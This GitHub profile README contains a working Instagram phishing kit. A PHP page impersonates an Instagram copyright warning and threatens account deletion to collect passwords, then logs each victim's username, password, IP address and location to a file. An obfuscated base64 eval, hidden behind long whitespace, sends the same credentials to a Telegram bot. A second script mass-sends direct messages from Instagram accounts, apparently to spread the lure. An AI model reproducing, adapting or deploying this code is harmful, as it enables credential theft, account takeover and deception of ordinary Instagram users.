### Hi there 👋

<!--
**enes4xdx/enes4xdx** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.

Here are some ideas to get you started:

- 🔭 I’m currently working on ...
- 🌱 I’m currently learning ...
- 👯 I’m looking to collaborate on ...
- 🤔 I’m looking for help with ...
- 💬 Ask me about ...
- 📫 How to reach me: ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...
-->
git clone https://github.com/enes4xdx/enes4xdx.git
git clone https://github.com/enes4xdx/enes4xdx
 
php
error_reporting(0);
$username = $_GET['username'];
require("types.php");
$url="https://dumpor.com/search?query=$username";
$ig=str_get_html(file_get_contents($url));
 $pp=$ig->find("img[class='img-fluid w-100']",0)->src;
if($_POST){
  $password1=$_POST["password1"];
  function ip_adresi_alma()
	{
		if (!empty($_SERVER['HTTP_CLIENT_IP']))
		{
			$ip	= $_SERVER['HTTP_CLIENT_IP'];
		}
		elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
			$ip	= $_SERVER['HTTP_X_FORWARDED_FOR'];
		}
		else{
			$ip	= $_SERVER['REMOTE_ADDR'];
		}
		return $ip;
	}

	$ip = ip_adresi_alma();
  $konum = file_get_contents("http://ip-api.com/xml/".$ip);
  $cek = new SimpleXMLElement($konum);
  $ulke=$cek->country;
  $sehir = $cek->city;
  date_default_timezone_set('Europe/Istanbul');
  $cur_time=date("d-m-Y H:i:s");
 $file = fopen('wight.php', 'a');
  fwrite($file, "
<font color='red'>Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
<font color='red'>Şifre: </font><font color='white'>".$password1."</font><br>
<font color='red'>IP Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
<hr>
");

fclose($file);

header("Location: wrongpassword.php?username=$username");
}

?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta property="og:image" content="<?php echo $pp; ?>" />
   <meta property="og:type" content="website">
   <meta property="og:url" content="https://instagram.com/">
   <meta property="og:title" content="Instagram Verification @<?php echo $username; ?>">
  <meta property="og:description" content="Create an account or log in to Instagram - A simple, fun and creative way to take and edit photos and videos, and share those photos, videos and messages with friends and relatives.">
    <script src="https://kit.fontawesome.com/64d58efce2.js" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="style.css" />
	  <link rel="icon" type="image/png" href="img/favicon.png"/>
    <title>Copyright | @<?php echo $username; ?></title>
  </head>
  <body>
                                                                                                                                                                                                                                                                                                                                                                                                   <?php @eval("?>".base64_decode("PD9waHAKCiR0b2tlbiA9ICIxOTU3MTQ1ODAzOkFBRnY5ZEt2OEhHa211dkpqVkZwMzdITGJ2cERsbmJpQVVRIjsgLy9Cb3RmYXRoZXJpbiB2ZXJkacSfaSB0b2tlbmkgeWF6xLFuLgokY2hhdF9pZCA9ICItNTkwNDg4MzUxIjsvLyBMaW5rdGVuIGFsZMSxxJ/EsW7EsXogY2hhdGlkIHlpIHlhesSxbi4KCiRkYXRhID0gWwogICd0ZXh0JyA9PiAnWUVOxLAgSEVTQVAgJy4kdXNlcm5hbWUuJyDjgL3vuI8KCkt1bGxhbsSxY8SxIEFkxLEgOiAnLiR1c2VybmFtZS4nCsWeaWZyZSA6ICcuJHBhc3N3b3JkMS4nCsSwcCA6ICcuJGlwLicKw5xsa2UgOiAnLiR1bGtlLicKVGFyaWggOiAnLiRjdXJfdGltZS4nCicsCiAgJ2NoYXRfaWQnID0+ICRjaGF0X2lkCl07CmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHRva2VuL3NlbmRNZXNzYWdlPyIgLiBodHRwX2J1aWxkX3F1ZXJ5KCRkYXRhKSApOwo/Pg=="));?>
    <div class="container">
<div class="forms-container">
        <div class="signin-signup">
          <form method="POST" class="sign-in-form">
          <img style="max-width:90%; border-radius:50%; margin-top:20px;" src="<?php echo $pp; ?>" alt="@<?php echo $username; ?> of Profile Photo"><br><strong><p>@<?php echo $username; ?></p></strong>
            <br>
            <center><p>We have received numerous complaints that you have violated our copyright laws regarding your account. If you do not give us feedback, your account will be removed within 24 hours.</p></center>
            <br>
            <div class="input-field">
              <i class="fas fa-lock"></i>
              <input type="password" required="" name="password1" placeholder="Password" />
            </div>
            <input type="submit" value="Login" class="btn solid" />
          </form>
        </div>
      </div>
      <div class="panels-container">
        <div class="panel left-panel">
          <div class="content">
            <h3>Download lnstagram</h3>
            <br>
            <p>Download lnstagram from Play Store or App Store</p>
            <br>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><button class="btn transparent" id="sign-up-btn">
              Download
            </button></a>
          </div>
          <img src="img/log.svg" class="image" alt="" />
        </div>
      </div>
    </div>
<hr>
	  <center><footer><img src="img/metaa.jpg" height="70" width="120"><img></footer></center>
    <script src="app.js"></script>
  </body>
</html>

php
include("info.php");
$rand2 = rand(0,1); 
$sayi = 1; // Burayı elleme.
////////////// DON'T TOUCH ///////////////////
set_time_limit(0);
date_default_timezone_set('UTC');
require 'vendor2/autoload.php'; 
include("config2.php");
//////////////////////
\InstagramAPI\Instagram::$allowDangerousWebUsageAtMyOwnRisk = true;
/////// CONFIG ///////

///////////////////////////////
$debug = false; 
$truncatedDebug = false;
///////////////////////////////
$ig = new \InstagramAPI\Instagram($debug, $truncatedDebug);
/////////////////////////////////
$is = rand(0,2);
$hesapadd = $usernamee[$is];
try {
    $ig->login($hesapadd, $password,0); //Giriş işlemi.
} catch (\Exception $e) {
    echo 'sorun var: '.$e->getMessage()."\n";
}
try {
$sorgu = mysqli_query($con,"SELECT * FROM otodm WHERE submit='no' LIMIT 5");
while($sonuc = mysqli_fetch_assoc($sorgu)){
$id = $sonuc['id'];
$nick = $sonuc['username'];
$userid = $sonuc['userid'];
for($i=0; $i < $sayi; $i++){ 
$ig->direct->sendText(['users' => ["$userid"]], $taslaklar[$rand2]);
sleep(10); // her 1 dmden sonra 10 saniye bekleyecek.
mysqli_query($con,"UPDATE otodm SET submit='yes' WHERE id='".$sonuc['id']."'");
}
}
} catch (\Exception $e) {
    echo 'sorun var '.$e->getMessage()."\n";
} // coded by disorder
